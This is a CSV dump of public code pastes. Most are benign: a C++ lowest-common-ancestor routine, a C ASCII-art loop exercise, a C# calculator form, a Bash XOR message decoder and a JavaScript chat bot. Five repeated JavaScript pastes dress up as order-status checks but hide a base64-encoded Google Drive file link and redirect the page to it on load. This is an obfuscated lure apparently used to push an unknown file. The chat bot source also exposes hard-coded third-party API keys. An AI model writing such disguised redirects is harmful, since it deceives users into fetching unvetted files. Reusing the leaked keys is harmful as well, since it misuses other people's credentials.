id,title,username,language,date,content
q4BHyNeF,LCA,Araf_12,C++,Monday 14th of April 2025 09:51:42 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;

const int N = 100005; // Adjust this based on your maximum number of nodes
const int LOG = 24;    // Enough for trees up to 2^24 nodes

vector<int> g[N];
int table[N][LOG];
int depth[N];

void dfs(int u, int p) {
    table[u][0] = p;
    depth[u] = depth[p] + 1;
    
    for(int i = 1; i < LOG; i++) {
        table[u][i] = table[table[u][i-1]][i-1];
    }
    
    for(int v : g[u]) {
        if(v == p) continue;
        dfs(v, u);
    }
}

int find_lca(int u, int v) {
    if(depth[u] > depth[v]) swap(u, v);
    int diff = depth[v] - depth[u];
    
    // Bring v to the same depth as u
    for(int i = 0; i < LOG; i++) {
        if(diff == 0) break;
        if(diff & (1 << i)) {
            v = table[v][i];
            diff -= (1 << i);
        }
    }
    
    if(u == v) return u;
    
    // Now find the LCA
    for(int i = LOG-1; i >= 0; i--) {
        if(table[u][i] != table[v][i]) {
            u = table[u][i];
            v = table[v][i];
        }
    }
    
    return table[u][0];
}

int main() {
    // Example usage:
    int n; // number of nodes
    cin >> n;
    
    // Build the tree (n-1 edges)
    for(int i = 0; i < n-1; i++) {
        int u, v;
        cin >> u >> v;
        g[u].push_back(v);
        g[v].push_back(u);
    }
    
    // Initialize
    depth[0] = -1; // Assuming root is 1 and its parent is 0
    dfs(1, 0);     // Start DFS from root (assuming root is 1)
    
    // Query processing
    int q;
    cin >> q;
    while(q--) {
        int u, v;
        cin >> u >> v;
        cout << ""LCA of "" << u << "" and "" << v << "" is: "" << find_lca(u, v) << endl;
    }
    
    return 0;
}"
gZ2pBCt6,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 09:41:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71503/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bVqaK7Au,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 09:26:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51801/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qJJxCgYm,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 09:11:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65211/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
veExE6KK,14-4-25 dibujos ASCII,Aluneth,C,Monday 14th of April 2025 09:00:52 AM CDT,"#include <stdio.h>
#include <stdlib.h>

/* char simbolo()
{
    char caracter;
    printf(""Ingrese con que simbolo desea hacer el dibujo: "");
    scanf(""%c"", &caracter);

    return caracter;
} */


int main()
{
    char caracter;
    int cantidad;
    printf(""Ingrese con que simbolo desea hacer el dibujo: "");
    scanf(""%c"",&caracter);
    printf(""Ingrese la cantidad de caracteres: "");
    scanf(""%d"",&cantidad);


    printf(""1).\n"");
    for (int j = 0; j<cantidad; j++) // Un solo for
    {
        printf(""%c"", caracter);
    }
    printf(""\n"");



    printf(""\n2).\n"");
    for (int i = 0; i<cantidad; i++) // Ambos dependen del mismo indice, ingresado por el usuario
    {
        for (int j = 0; j<cantidad; j++)
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }


    printf(""\n3).\n"");
    for (int i = 0; i<cantidad; i++)
    {
        for (int j = 0; j<=i; j++) // se usa <= para que se haga el recorrido completo sin \n
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }


    printf(""4).\n"");
    for (int i = 0; i<cantidad; i++) // Se invierte el simbolo, se inicia en cantidad y se resta el indice j
    {
        for (int j = cantidad; j>i; j--)
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }

    printf(""\n5).\n"");
    for (int i = 0; i<cantidad; i++)
    {
        for (int j = 0; j<=i; j++)
        {
            printf("" "");
        }
        printf(""%c"", caracter);
        printf(""\n"");
    }

    printf(""6).\n"");
    for (int i = 0; i<cantidad; i++)
    {
        for (int j = cantidad; j>=i; j--)
        {
            printf("" "");
        }
        printf(""%c"", caracter);
        printf(""\n"");
    }

    printf(""\n7).\n"");
    for (int i = 0; i<4; i++)
    {

        for (int j = 3; j>i; j--)
        {
            printf("" "");
        } // Fin del for que solo imprime espacios

        for (int k = 0; k<=i*2; k++)
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }


    printf(""8).\n"");
    for (int i = 0; i<4; i++)
    {

        for (int j = 0; j<i; j++)
        {
            printf("" "");
        } // Fin del for que solo imprime espacios

        for (int k = 7; k>=i*2; k--)
        {
            printf(""%c"", caracter);
        }
        printf(""\n h""); // Averiguar como eliminar el ulimo espacio
    }

    return 0;
}
"
bpJvitHy,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 08:55:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68308/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k6GcENyF,Project Memphis 2 Source Code,nonogamer9,JavaScript,Monday 14th of April 2025 08:53:07 AM CDT,"const prefix = ""mem!"";
const botname = ""Memphis ("" + prefix + ""start)"";
const version = ""2.0.0"";
const update = ""April 14th, 2025"";
var uses = 0;

// External API URLs
const PUTER_JS_URL = ""https://js.puter.com/v2/"";
const WEATHER_API_KEY = ""dcc6b2a3fa3d4fe58d9193316232905"";
const GOOGLE_API_KEY = ""AIzaSyDQJ7SjasKcPq_bJhCyxuaoWiVydYTGDK0"";
const GOOGLE_CX = ""c3619c6476b78442f""; // Custom Search Engine ID
const TRANSLATE_API_KEY = ""4a4725a769msh10c74bc91185a85p182f25jsn9a1a93fbbb77"";

// Load external script for AI
const script = document.createElement(""script"");
script.src = PUTER_JS_URL;
document.head.appendChild(script);

// Helper function to send messages
function sendMsg(msg) {
    setTimeout(() => {
        socket.emit(""talk"", { text: msg });
    }, 1100);
}

// AI Query Function
async function queryPuterAPI(inputText) {
    try {
        const response = await puter.ai.chat(inputText);
        return response || ""The AI couldn't generate a proper response."";
    } catch (error) {
        console.error(""Error querying Puter.js API:"", error);
        return ""Sorry, I couldn't process your request."";
    }
}

// Initialize bot
setTimeout(() => {
    socket.emit(""command"", { list: [""name"", botname] });
}, 1000);

setTimeout(() => {
    sendMsg(`${botname} is online. Type ${prefix}start for available commands.`);
}, 2000);

// Command handler
socket.on(""talk"", async (message) => {
    const text = message.text.trim(); // Trim whitespace for cleaner parsing

    // Check if the message starts with the prefix
    if (!text.startsWith(prefix)) {
        return; // Ignore messages that don't start with the bot prefix
    }

    // Extract command and arguments
    const [command, ...args] = text.slice(prefix.length).split("" "");
    const argString = args.join("" "").trim();

    // Command Handling
    switch (command.toLowerCase()) {
        case ""ask"":
            if (!argString) {
                sendMsg(`Please provide a question or prompt after '${prefix}ask'.`);
                return;
            }
            sendMsg(""- Processing your query..."");
            const aiResponse = await queryPuterAPI(argString);
            sendMsg(`**AI Response:** ${aiResponse}`);
            uses++;
            break;

        case ""start"":
            sendMsg(""__Project Memphis Start Menu__\n""
                + ""- AI: `"" + prefix + ""ask {question}`\n""
                + ""- Weather: `"" + prefix + ""weather {location}`\n""
                + ""- Games: `"" + prefix + ""snake` or `"" + prefix + ""maze`\n""
                + ""- Utilities: `"" + prefix + ""notepad`, `"" + prefix + ""calculator`, `"" + prefix + ""clock`\n""
                + ""- Search: `"" + prefix + ""google {query}`, `"" + prefix + ""translate {text} to {language}`"");
            break;

        case ""weather"":
            if (!argString) {
                sendMsg(`Please provide a location after '${prefix}weather'.`);
                return;
            }
            getWeather(argString);
            break;

        case ""snake"":
            handleSnakeCommand(argString);
            break;

        case ""maze"":
            handleMazeCommand(argString);
            break;

        case ""clock"":
            sendMsg(getCurrentTime());
            break;

        case ""calculator"":
            if (!argString) {
                sendMsg(`Please provide an operation after '${prefix}calculator'.`);
                return;
            }
            calculator(argString);
            break;

        case ""notepad"":
            handleNotepadCommand(argString);
            break;

        case ""google"":
            if (!argString) {
                sendMsg(`Please provide a search query after '${prefix}google'.`);
                return;
            }
            googleSearch(argString);
            break;

        case ""translate"":
            if (!argString) {
                sendMsg(`Please provide text and target language in the format '${prefix}translate <text> to <language>'.`);
                return;
            }
            translateText(argString);
            break;

        default:
            // Handle unrecognized commands gracefully
            sendMsg(`Invalid command. Type '${prefix}start' for a list of commands.`);
    }
});

// Utility Functions

function getCurrentTime() {
    const now = new Date();
    return `Current time is: ${now.toLocaleTimeString(""en-US"", { hour12: true })}`;
}

function getWeather(location) {
    const apiUrl = `https://api.weatherapi.com/v1/current.json?key=${WEATHER_API_KEY}&q=${encodeURIComponent(location)}`;
    
    fetch(apiUrl)
        .then((response) => response.json())
        .then((data) => {
            if (data.error) {
                sendMsg(""Unable to retrieve weather information. Please check the location."");
            } else {
                const weatherInfo = `Weather in ${data.location.name}, ${data.location.country}:\nCondition: ${data.current.condition.text}\nTemperature: ${data.current.temp_c}°C\nHumidity: ${data.current.humidity}%\nWind Speed: ${data.current.wind_kph} km/h`;
                sendMsg(weatherInfo);
            }
        })
        .catch((error) => {
            console.error(""Error:"", error);
            sendMsg(""An error occurred while retrieving weather information."");
        });
}

// Snake Game Variables
let snake = [{ x: 0, y: 0 }]; // Snake's initial position
let food = { x: 5, y: 5 }; // Food's initial position
let direction = ""right""; // Initial direction of the snake

function handleSnakeCommand(command) {
    if (command === ""play"") {
        startSnakeGame();
    } else if ([""up"", ""down"", ""left"", ""right""].includes(command)) {
        updateSnakeDirection(command);
        moveSnake();
        if (checkCollision()) {
            sendMsg(""Game Over! You collided with the wall or yourself."");
            return;
        }
        checkFoodEaten();
        sendMsg(renderSnakeGame());
    } else {
        sendMsg(`Invalid command. Use \`${prefix}snake play\` to start the game and \`${prefix}snake up/down/left/right\` to control.`);
    }
}

function startSnakeGame() {
    snake = [{ x: 0, y: 0 }];
    food = { x: Math.floor(Math.random() * 14), y: Math.floor(Math.random() * 6) };
    direction = ""right"";
    sendMsg(renderSnakeGame());
}

function updateSnakeDirection(command) {
    if (command === ""up"" && direction !== ""down"") direction = ""up"";
    else if (command === ""down"" && direction !== ""up"") direction = ""down"";
    else if (command === ""left"" && direction !== ""right"") direction = ""left"";
    else if (command === ""right"" && direction !== ""left"") direction = ""right"";
}

function moveSnake() {
    const head = { ...snake[0] };
    if (direction === ""up"") head.y--;
    else if (direction === ""down"") head.y++;
    else if (direction === ""left"") head.x--;
    else if (direction === ""right"") head.x++;
    snake.unshift(head);
}

function checkCollision() {
    const head = snake[0];
    if (head.x < 0 || head.x >= 14 || head.y < 0 || head.y >= 6) return true; // Wall collision
    for (let i = 1; i < snake.length; i++) {
        if (snake[i].x === head.x && snake[i].y === head.y) return true; // Self-collision
    }
    return false;
}

function checkFoodEaten() {
    const head = snake[0];
    if (head.x === food.x && head.y === food.y) {
        food = { x: Math.floor(Math.random() * 14), y: Math.floor(Math.random() * 6) };
    } else {
        snake.pop(); // Remove tail to maintain length
    }
}

function renderSnakeGame() {
    let board = Array.from({ length: 6 }, () => Array(14).fill(0));
    for (const segment of snake) board[segment.y][segment.x] = 1;
    board[food.y][food.x] = 2;
    return board.map(row => row.join("" "")).join(""\n"");
}

 
 
function handleMazeCommand(command) {
    if (command === ""play"") {
        startMazeGame();
    } else if (command === ""up"" || command === ""down"" || command === ""left"" || command === ""right"") {
        movePlayer(command);
    } else if (command === ""guide"") {
        sendMsg(""Welcome to mem!maze!\n\n""
          + ""You are represented by the number 9, and your goal is to reach the number 3.\n""
          + ""Use `"" + prefix + ""maze up/down/left/right` to move in the maze.\n""
          + ""Good luck!"");
    } else {
        sendMsg(""Invalid command. Use `"" + prefix + ""maze play` to start the game, `"" + prefix + ""maze up/down/left/right` to control, or `"" + prefix + ""maze guide` for instructions."");
    }
}
 
// Maze Game Variables
const mazeRows = 6;
const mazeColumns = 14;
const wallChance = 0.3;
let maze;
let playerPosition;
let goalPosition;

function handleMazeCommand(command) {
    if (command === ""play"") {
        startMazeGame();
    } else if ([""up"", ""down"", ""left"", ""right""].includes(command)) {
        movePlayer(command);
    } else if (command === ""guide"") {
        sendMsg(`Welcome to mem!maze!\n\nYou are represented by the number 9, and your goal is to reach the number 3.\nUse \`${prefix}maze up/down/left/right\` to move in the maze.\nGood luck!`);
    } else {
        sendMsg(`Invalid command. Use \`${prefix}maze play\` to start the game, \`${prefix}maze up/down/left/right\` to control, or \`${prefix}maze guide\` for instructions.`);
    }
}

function startMazeGame() {
    maze = generateRandomMaze();
    playerPosition = { x: Math.floor(mazeColumns / 2), y: mazeRows - 1 };
    maze[playerPosition.y][playerPosition.x] = 9;
    goalPosition = generateRandomGoalPosition();
    maze[goalPosition.y][goalPosition.x] = 3;
    sendMsg(renderMaze());
}

function generateRandomMaze() {
    return Array.from({ length: mazeRows }, () =>
        Array.from({ length: mazeColumns }, () => Math.random() < wallChance ? 1 : 0)
    );
}

function generateRandomGoalPosition() {
    let x, y;
    do {
        x = Math.floor(Math.random() * mazeColumns);
        y = Math.floor(Math.random() * mazeRows);
    } while (maze[y][x] !== 0);
    return { x, y };
}

function movePlayer(command) {
    const { x, y } = playerPosition;
    let newX = x, newY = y;

    if (command === ""up"") newY--;
    else if (command === ""down"") newY++;
    else if (command === ""left"") newX--;
    else if (command === ""right"") newX++;

    if (newX >= 0 && newX < mazeColumns && newY >= 0 && newY < mazeRows && maze[newY][newX] !== 1) {
        maze[y][x] = 0; // Clear previous position
        playerPosition = { x: newX, y: newY };
        maze[newY][newX] = 9; // Update player position

        if (newX === goalPosition.x && newY === goalPosition.y) {
            sendMsg(""Congratulations! You reached the goal!"");
            startMazeGame(); // Restart game
            return;
        }
        sendMsg(renderMaze());
    } else {
        sendMsg(""You cannot move in that direction."");
        sendMsg(renderMaze());
    }
}

function renderMaze() {
    return maze.map(row => row.join("" "")).join(""\n"");
}

// Notepad Variables
let notepads = [];
let notepadCounter = 1;
let notepadState = 'idle'; // Tracks the state of the current notepad

function handleNotepadCommand(command) {
    const [action, ...args] = command.split("" "");
    const content = args.join("" "").trim();

    switch (action.toLowerCase()) {
        case ""create"":
            createNotepad();
            break;

        case ""write"":
            if (!content) {
                sendMsg(""Please provide content to write. Example: `mem!notepad write This is my note.`"");
            } else {
                writeOnNotepad(content);
            }
            break;

        case ""save"":
            saveNotepad();
            break;

        case ""list"":
            listNotepads();
            break;

        case ""delete"":
            if (!args[0]) {
                sendMsg(""Please provide a notepad ID to delete. Example: `mem!notepad delete 1`."");
            } else {
                deleteNotepad(args[0]);
            }
            break;

        case ""modify"":
            if (!args[0]) {
                sendMsg(""Please provide a notepad ID to modify. Example: `mem!notepad modify 1`."");
            } else {
                modifyNotepad(args[0]);
            }
            break;

        case ""read"":
            if (!args[0]) {
                sendMsg(""Please provide a notepad ID to read. Example: `mem!notepad read 1`."");
            } else {
                readNotepad(args[0]);
            }
            break;

        default:
            sendMsg(`Invalid command. Use \`${prefix}notepad create/write/save/list/delete/modify/read\`.`);
    }
}

function createNotepad() {
    if (notepadState !== 'idle') {
        sendMsg(""A notepad is already in progress. Please save or cancel it before creating a new one."");
        return;
    }

    const newNotepad = { id: notepadCounter++, content: """", created: new Date() };
    notepads.push(newNotepad);
    notepadState = 'created';
    sendMsg(`New notepad created with ID: ${newNotepad.id}`);
}

function writeOnNotepad(content) {
    const currentNotepad = getCurrentNotepad();
    if (!currentNotepad) return;

    currentNotepad.content += content + ""\n"";
    notepadState = 'modified';
    sendMsg(""Content added to the current notepad."");
}

function saveNotepad() {
    const currentNotepad = getCurrentNotepad();
    if (!currentNotepad) return;

    sendMsg(`Notepad ID ${currentNotepad.id} saved successfully.`);
    console.log(`Saved Notepad Content:\n${currentNotepad.content}`);
    notepads = notepads.map(np => (np.id === currentNotepad.id ? currentNotepad : np));
    notepadState = 'idle';
}

function listNotepads() {
    if (notepads.length === 0) {
        sendMsg(""No notepads have been created yet."");
        return;
    }

    let response = ""__List of Notepads__:\n"";
    for (const np of notepads) {
        response += `ID: ${np.id}, Created On: ${np.created.toLocaleString()}, Content Length: ${np.content.length} characters\n`;
    }
    sendMsg(response);
}

function deleteNotepad(id) {
    const index = parseInt(id, 10) - 1;
    if (index < 0 || index >= notepads.length) {
        sendMsg(""Invalid Notepad ID. Please provide a valid ID from the list."");
        return;
    }

    notepads.splice(index, 1);
    sendMsg(`Deleted Notepad with ID: ${id}`);
}

function modifyNotepad(id) {
    const index = parseInt(id, 10) - 1;
    if (index < 0 || index >= notepads.length) {
        sendMsg(""Invalid Notepad ID. Please provide a valid ID from the list."");
        return;
    }

    const selectedNotepad = notepads[index];
    selectedNotepad.content += ""\n""; // Open it for modification
    notepads[index] = selectedNotepad;
    
	sendMsg(`Modifying Notedpad`);
}

function readNotepad(id) {
    const notepadId = parseInt(id, 10);
    const selectedNotepad = notepads.find(np => np.id === notepadId);

    if (!selectedNotepad) {
        sendMsg(""Invalid Notepad ID. Please provide a valid ID from the list."");
        return;
    }

    if (selectedNotepad.content.trim() === """") {
        sendMsg(`Notepad ID ${notepadId} is empty.`);
    } else {
        sendMsg(`__Content of Notepad ID ${notepadId}__:\n${selectedNotepad.content}`);
    }
}
 
// New calculator function
function calculator(operation) {
    const parts = operation.split("" "");
    const operator = parts[1];
    const a = parseFloat(parts[0]);
    const b = parseFloat(parts[2]);
 
    let result;
    switch (operator) {
        case ""+"":
            result = a + b;
            break;
        case ""-"":
            result = a - b;
            break;
        case ""*"":
            result = a * b;
            break;
        case ""/"":
            result = a / b;
            break;
        default:
            sendMsg(""Invalid operation. Please use the format: 'num1 operator num2'. Supported operators are +, -, *, /."");
            return;
    }
 
    sendMsg(`Result: ${result}`);
}

function googleSearch(searchQuery) {
    const apiUrl = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(searchQuery)}&key=${GOOGLE_API_KEY}&cx=${GOOGLE_CX}`;

    fetch(apiUrl)
        .then((response) => response.json())
        .then((data) => {
            if (data.items && data.items.length > 0) {
                const resultsText = data.items.slice(0, 2).map((item, index) => `${index+1}. ${item.title}\n   ${item.link}`).join(""\n"");
                sendMsg(`Google Search Results for '${searchQuery}':\n${resultsText}`);
            } else {
                sendMsg(`No results found for '${searchQuery}'.`);
            }
        })
        .catch((error) => {
            console.error(""Error fetching Google Search API:"", error);
            sendMsg(""An error occurred while fetching Google Search results."");
        });
}

function translateText(translationQuery) {
    const languages = {
        english: 'en',
        french: 'fr',
        japanese: 'ja',
        spanish: 'es',
        german: 'de',
        chinese: 'zh',
        russian: 'ru',
        italian: 'it',
        portuguese: 'pt',
        dutch: 'nl',
        korean: 'ko',
        arabic: 'ar',
        hindi: 'hi',
        greek: 'el',
        swedish: 'sv',
        turkish: 'tr',
        vietnamese: 'vi',
        thai: 'th',
        hebrew: 'he',
        polish: 'pl',
        danish: 'da',
        finnish: 'fi',
        norwegian: 'no',
        czech: 'cs',
        hungarian: 'hu',
        indonesian: 'id',
        malay: 'ms',
        romanian: 'ro',
        bulgarian: 'bg',
        croatian: 'hr',
        slovak: 'sk',
        ukrainian: 'uk'
    };

    if (translationQuery.trim().toLowerCase() === ""list languages"") {
        sendMsg(""Supported languages are:\n"" + Object.keys(languages).join("", ""));
        return;
    }

    const [text, targetLanguage] = translationQuery.split("" to "");
    if (!text || !targetLanguage) {
        sendMsg(""Invalid format. Use `"" + prefix + ""translate <text> to <target language>`."");
        return;
    }

    const targetLangCode = languages[targetLanguage.trim().toLowerCase()];
    if (!targetLangCode) {
        sendMsg(""Invalid target language. Use `"" + prefix + ""translate list languages` to see supported languages."");
        return;
    }

    const apiUrl = ""https://deep-translate1.p.rapidapi.com/language/translate/v2"";

    const data = {
        q: text.trim(),
        target: targetLangCode
    };

    fetch(apiUrl, {
        method: ""POST"",
        headers: {
            ""Content-Type"": ""application/json"",
            ""X-RapidAPI-Host"": ""deep-translate1.p.rapidapi.com"",
            ""X-RapidAPI-Key"": TRANSLATE_API_KEY
        },
        body: JSON.stringify(data)
    })
    .then((response) => response.json())
    .then((data) => {
        if (data.data && data.data.translations) {
            sendMsg(`Translation:\n""${text.trim()}"" → ""${data.data.translations.translatedText}""`);
        } else {
            sendMsg(""Translation error. Please check the input and target language."");
            console.error(""Translation error:"", data);
        }
    })
    .catch((error) => {
        console.error(""Error:"", error);
        sendMsg(""An error occurred while translating the text."");
    });
}
"
NZ36sDyp,CalcStart,cuniszkiewicz,C#,Monday 14th of April 2025 08:41:32 AM CDT,"using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Calculator
{
    public partial class Form1 : Form
    {
        double a, b, result = 0;
        char operation;

        public Form1()
        {
            InitializeComponent();
        }

        private void btnEq_Click(object sender, EventArgs e)
        {
            b = int.Parse(lblScreen.Text);
            lblScreen.Text = """";

            switch (operation)
            {
                case '+':
                    result = a + b;
                    break;
                case '-':
                    result = a - b;
                    break;
                case '*':
                    result = a * b;
                    break;
                case '/':
                    if (b != 0)
                        result = a / b;
                    else
                        MessageBox.Show(""Don't devide by 0!"");
                    break;

            }

            //lblScreen.Text = result.ToString();
            lblScreen.Text = $""{result}""; 
        }

        private void btn1_Click(object sender, EventArgs e)
        {
            Button button = (Button)sender;
            lblScreen.Text += button.Text;
        }

        private void btnPlus_Click(object sender, EventArgs e)
        {
            Button button = (Button)sender;
            a = int.Parse(lblScreen.Text);
            lblScreen.Text = """";
            operation = char.Parse(button.Text);
        }
    }
}
"
C4JQghrG,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 08:40:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67962/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KzFJr2CW,Untitled,lu6id,Bash,Monday 14th of April 2025 08:36:34 AM CDT,"#!/bin/bash
hex=""1f0b170b1c430f00001c4e060a001c430a""
key=78
msg=""""
for ((i=0; i<${#hex}; i+=2)); do
  byte=$((16#${hex:$i:2}))
  dec=$((byte ^ key))
  char=$(printf '%03o' $dec)
  msg+=$(printf ""\\$char"")
done
say ""$msg""
"
